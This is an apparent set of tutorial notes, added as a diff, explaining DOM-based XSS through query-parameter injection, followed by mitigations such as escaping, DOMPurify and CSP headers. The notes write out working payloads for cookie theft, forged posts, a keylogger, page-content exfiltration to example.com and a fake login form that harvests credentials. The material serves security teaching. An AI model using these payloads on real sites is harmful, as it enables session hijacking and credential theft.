@@ -1,0 +1,179 @@
+vulnerability - 
+
+example1.html - 
+    now if you see we have a basic html page, in this page what i have, i have a simple script this is my script where i am reading something from a query param.
+    from that query params, i am reading some information and i am adding injecting from that information on my page, this kind of thing we often do that.
+
+    now what could be the problem if this is a obious case, example in such cases if i go to flipkart, in flipkart if you see you have something called marketplace in query param, and this marketplace basically says that which is retrived and accessed inside the 
+    page and multiple places, may be identify what is the theme basically you have, or another sort of configuration.
+    now you are reading something. 
+        flipkart.com/grocery-supermart-store?marketplace=GROCERY
+
+    in our case what we are reading, we are reading something called name from the query param, now lets understand how this can besically create a problem.
+
+    now i will open it with live server.
+
+    http://127.0.0.1:5500/XSS/vulnerability/example1.html?name="Rushikesh jere"
+
+    i added my name in the query param, and if you see whatever name i entered over here, because i am reading that name and basically update that into my dom, that is what exactly happened. 
+
+    in this case there is no any harm, so let me show you what could be the problem in such cases.
+
+example2.html - (USER SESSION HIJACKING)
+
+    so what i have, i have exactly same code, which says that please go read the data from your param, and update that data into your innerHTML
+    which is username innerHTML that we saw, along with that we have some cookies that will also set in our application, so this is some cookies idealy set from the server
+    but just for the demonstration i am setting it from the client.
+
+    lets again open this from the live server, and lets try to see what happen in such cases.
+
+    its same on opening, but what i am going to do, i am going to change something in the URL, i am going to maniplute my url and we can see how things are going to work.
+
+    ?name=<img src="does-not-exist" onerror="var img = document.createElement(\'img\'); 
+    img.src = \'http://127.0.0.1:5501/cookie?data=\'+document.cookie;
+    document.querySelector(\'body\').appendChild(img)">
+
+    so try to understand what i did, there is a query param which is a name, inside name what i am injecting what i am passing is an image tag, a very intresting there is a img tag, 
+    there was a time where you could actually pass an script tag all together or pass a javascript code, now a days browser are smart and you cannot inject a script tag over here.
+
+    now what we are saying is something does not exist, please send a onerror please basically execute this code of script,
+    what does this code? try to understand - it simply says that please create a node which is called an img and have a img src which is this.
+    in this img src where you are trying to read the document cookies , your are executing a javascript code where you are saying boss please get your cookie 
+    pass that cookie into this url which is getting form, ideally this img.src should be a img but attacker was smart enuf no no this is not image this is a random endpoint where i wanted to send some request 
+    containing your information related to the cookie. 
+
+example3.html - (UNATHORIZED ACTIVITIES)
+
+    consider you have a function, this function takes a title and description and based on title and description it try to do genarate link and do something something,
+    now in this case, it is going to create a post request, on your own application get the credientials put the credientials by default and i will be sending that information getting from title and the description into this XMLHttpRequest function.
+    
+    so you have a generic function which take the title and description, genarate a post request, and send that request into the network call, now we may be thinking how this utility function could be harmfull?
+
+    consider example from our query param that we are having, if i write a code in such a way that the method that we have internally, i execute that passing the relevant information like i may be passing dam shitty title and description and trigger this function.
+    under the hood because it your domain, it has credientials, it has everything, it has a function which is written which says how to do everything then they can steel your information.
+
+    now lets see in practical, 
+
+        ?name=<img src="error.gif" onerror="createPost('HACK TITLE', 'HACK_DESCRIPTION');"/>
+
+        You are able to create post behalf of the user, by passing your own content to that so in this case try to understand what i am doing , if there is a error there is a img basically that is going to be loaded
+        and such img does not exist so it will throw the error, so if it throws the error please go to the onerror execute this callback, when you execute this callback then it will call the createPost function.
+        which says that please pass the title HACK_TITLE and pass any dam description. 
+
+        because your createPost was available on the gloable level, and this could be executed and this can create a damage.
+
+        lets try to see what happen if we enter this url in query to a name.
+        so there is a request which went as an post request, what we get as a payload is HACK_TITLE and HACK_DESCRIPTION because we does not handle the user input properly and from your code in the browser i could see what are the generic method which are written 
+        i could figure it out what are the params i need to pass, it knowns you cant do enything because ultimately what happens the request went from your system. there is no cross origin because having all the credientials carrying forward.
+
+        you can see in the HEADERS section the cookies are also automatically getting passed to this. now cookies are also get passed what it meant by authorization and everything will happen. if http://127.0.0.1:5502/post if this endpoint is up you could have created a post req man.
+
+        
+example4.html - (Capturing Keystores)
+
+    In this case what will happen, i will write some script over here this script is going to monitor everything that we are going to do like
+    consider we have a codebase something similar to this  
+
+        //code
+        var timeout;
+        var buffer = ";
+        document.querySelector('body').addEventListener('keypress', function(event){
+            if(event.which !== 0) {
+                clearTimeout(timeout);
+                buffer += String.fromCharCode(event.which);
+                timeout = setTimeout(function(){
+                    var xhr = new XMLHttpRequest();
+                    var uri = 'http://localhost:3001/keys?data='+ encodeURIComponent(buffer);
+                    xhr.open('GET',uri);
+                    xhr.send();
+                    buffer = ";
+                },400);
+            }
+        });
+
+        this is the code which i am going to inject in my query param somehow, basically what it does there is a event listener which is keypress on the keypress it will try to get character code and it is making a req to the endnpoint. 
+
+example5.html - (stealing some critical information)
+
+    in this i could basically grab the html content of the page that is what exactly i wanted to do now how we can do that?
+
+     encodeURIComponent("<img src=\"empty.gif\" onerror=\"var mycookie= document.cookie; new Image().src=`https://example.com/fakepage.php?output=${document.body.innerHTML}`;\"/>")
+
+     so name= will put above link, basically onerror it try to get my cookie and on output i am trying to get body.innerHTML, actually i am sending my entire innerHTML to the fakeurl.
+    you may be having a bank information or you may be having your bank balance or transaction details on the page which is rendered which is there in the dom i am reading the entire dom and passing it.
+
+
+example6.html - (phishing attack)
+
+    encodeURIComponent(`<h3>Please login to proceed</h3> <form action=http://example.com/fakepage.php>Username:<br> <input type="username" name="username"></br>Password:<br> <input type="password" name="password"></br><br><input type="submit" value="login"></br>`)
+
+    if i put the above link in the name= link, then it actually create a form and this form is may be actually look like that may be similar to your application and this will replace your original application form 
+    an fter that if user enter his credientials username and password then the username and password will be actually flowing to the attackers via the fakepage.com engpoint. 
+
+
+
+Metigitions - 
+
+    1) List all possible way to take user input 
+    2) use textContent or innerText instead of innerHTML(refer image)
+    3) use Escaping - we can try to escape some of the characters like script tag, starting you can see < or > try to escape that with the encoded value so that does not executed at all. (refer image)
+    4) Using library like react 
+    5) sanitizer your data using libraries DOMPurify 
+    6) CSP Headers - (refer image)
+    7) avoid using eval.
+
+        6) CSP HEADERS AND TYPES - 
+            So there are many headers that can be set from the server into your application which decide what kind of resources be loaded and from where these resources can be loaded,
+            and taking a controle, do you want to execute it or do you dont want to execute resources comming from different places so you are the complete owner.
+            and on top of it the scripts that you have in your application also, do you wanted to trust it how do you get to know the script is your script or the script is injected by someone else.  
+            all of these things are taken care by CSP Headers.
+
+             content Security Policy - 
+                    Allowed Sources  - you can tell what are the allowed sources for your content like you can decide from where you wanted to load your script       
+                    Script Nonces    - any thing which is there as a inline script, how do you wanted to ensure that the inline script is belongs to you, so you can add nounces to identify oh this is my script and this is script injected by someone else.             
+                    Report-only mode - in worst case if someone reaches and try to do xss attack in your system in such cases you actually wanted to report, so we can get the report from where these xss attacks has been tried. 
+                    
+                Allowed Sources - 
+
+                    so we have created one basic express server, and expose the index.html page from that server 
+                    now we wanted to try out multiple things some scripts are our scrips somne scripts which are comming from outside so we will expirement and see how i can take a controle on the script basially which are getting loaded 
+                    from our application or getting loaded from external sources. 
+
+                    so we have added the script inside the index.html 
+                        <script src="http://unsecure.com/abc.js"></script>
+
+                    now i wanted to take control and wanted to say that no i dont wanted to trust the domain which is comming from outside.
+                    so we will set some csp headers 
+
+                    so if we trying to load an image from the linkedin img address inside the index.html and if we set the below csp headers then it is not allowed to load any img or script from the outside
+
+                        //set this middleware function in the backend server and above app.use(express.static('public')); this code
+                        app.use((req, res, next) => {
+
+                            res.setHeader(
+                                'Content-Security-Policy',
+                                "default-src 'self'; script-src 'self' http://unsecure.com;"
+                            )
+
+                            next();
+                        })
+
+                Script Nonces -
+
+                    add this below two scripts inside the index.html - 
+                    <script nonce="randomKey"> console.log('This is my trusted code!')</script>
+                    <script> console.log('This is my untrusted code!')</script>
+
+
+                    add this header inside the index.js server file - 
+                    'nonce-randomKey'
+
+                    if we add those nonce key inside the server then only trusted script will be execute, and if we check the html code in the browser we cannot see the nonce so it is safe to use in the script.
+
+                Report-only mode -
+
+                    // we have to set this headers in the server side index.js file and it works in only https
+                    report-to default;  //new way
+                    report-uri URL;     // older way
+
+
